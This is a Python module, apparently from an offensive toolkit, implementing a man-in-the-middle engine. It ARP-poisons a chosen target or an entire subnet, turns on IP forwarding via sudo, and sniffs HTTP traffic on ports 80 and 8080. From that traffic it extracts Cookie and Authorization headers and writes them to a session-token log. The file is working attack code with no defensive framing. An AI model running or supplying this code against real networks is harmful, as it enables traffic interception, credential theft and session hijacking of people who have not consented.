import os
import time
import threading
import sys
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, Raw, conf, get_if_list
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()


class MITMEngine:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interface = ""
        self.gateway_ip = ""
        self.targets = []  # List of (IP, MAC) tuples

    def toggle_forwarding(self, state=True):
        """Enables IP forwarding across macOS and Linux."""
        val = 1 if state else 0
        try:
            if sys.platform == 'darwin':
                os.system(
                    f"sudo sysctl -w net.inet.ip.forwarding={val} > /dev/null")
            else:
                os.system(
                    f"echo {val} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
        except Exception as e:
            console.print(
                f"[yellow][!] Forwarding config failed: {e}[/yellow]")

    def get_mac(self, ip):
        """Resolves MAC address with high-retry logic."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=3, retry=2, verbose=False, iface=self.interface)
            return ans[0][1].hwsrc if ans else None
        except:
            return None

    def packet_callback(self, packet):
        """Live Session Intelligence: Auto-extracts tokens from the stream."""
        if packet.haslayer(Raw) and packet.haslayer(IP):
            load = str(packet[Raw].load)
            # Detect Session Identifiers
            if "Cookie:" in load or "Authorization:" in load:
                src_ip = packet[IP].src
                console.print(
                    f"[bold red][!] INTEL INTERCEPTED ({src_ip}):[/bold red] Session Token Found")
                if not os.path.exists("logs"):
                    os.makedirs("logs")
                with open("logs/session_tokens.txt", "a") as f:
                    f.write(f"[{time.ctime()}] {src_ip} -> {load}\n")

    def poison(self, target_ip, target_mac, gateway_mac):
        """Asynchronous poisoning loop for a target."""
        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip)
        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not self.stop_event.is_set():
            sendp(target_pkt, verbose=False, iface=self.interface)
            sendp(router_pkt, verbose=False, iface=self.interface)
            time.sleep(1.5)

    def restore(self, target_ip, target_mac, gateway_mac):
        """Restores ARP tables to original state."""
        res_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
        res_router = Ether(dst=gateway_mac)/ARP(op=2, pdst=self.gateway_ip,
                                                hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        for _ in range(5):
            sendp(res_target, verbose=False, iface=self.interface)
            sendp(res_router, verbose=False, iface=self.interface)
            time.sleep(0.2)

    def run(self):
        draw_header("MITM Engine: Subnet Dominator")

        # Interface Discovery
        ifaces = get_if_list()
        if_table = Table(title="Detected Interfaces", border_style="cyan")
        if_table.add_column("Interface Name")
        for i in ifaces:
            if_table.add_row(i)
        console.print(if_table)

        self.interface = console.input(
            "[bold yellow]Select Interface (e.g. en0): [/bold yellow]").strip()
        if self.interface not in ifaces:
            return console.print("[red]Invalid Interface.[/red]")

        self.gateway_ip = console.input(
            "[bold yellow]Gateway (Router) IP: [/bold yellow]")
        target_input = console.input(
            "[bold yellow]Target IP or Range (e.g. 192.168.1.0/24): [/bold yellow]")

        gw_mac = self.get_mac(self.gateway_ip)
        if not gw_mac:
            return console.print("[red]Could not resolve Gateway MAC.[/red]")

        # Subnet Resolution
        console.print("[*] Mapping subnet targets...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                     timeout=2, verbose=False, iface=self.interface)
        for _, rcv in ans:
            if rcv.psrc != self.gateway_ip:
                self.targets.append((rcv.psrc, rcv.hwsrc))

        if not self.targets:
            return console.print("[red]No active targets found.[/red]")

        self.toggle_forwarding(True)
        console.print(
            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")

        for ip, mac in self.targets:
            threading.Thread(target=self.poison, args=(
                ip, mac, gw_mac), daemon=True).start()

        console.print(
            "[bold red][!] Interception Active. Press Ctrl+C to stop.[/bold red]")
        try:
            from scapy.all import sniff
            sniff(iface=self.interface, prn=self.packet_callback,
                  store=0, filter="tcp port 80 or tcp port 8080")
        except KeyboardInterrupt:
            self.stop_event.set()
            for ip, mac in self.targets:
                self.restore(ip, mac, gw_mac)
            self.toggle_forwarding(False)
            console.print("\n[yellow][*] Network Restored.[/yellow]")


def start_mitm():
    engine = MITMEngine()
    engine.run()
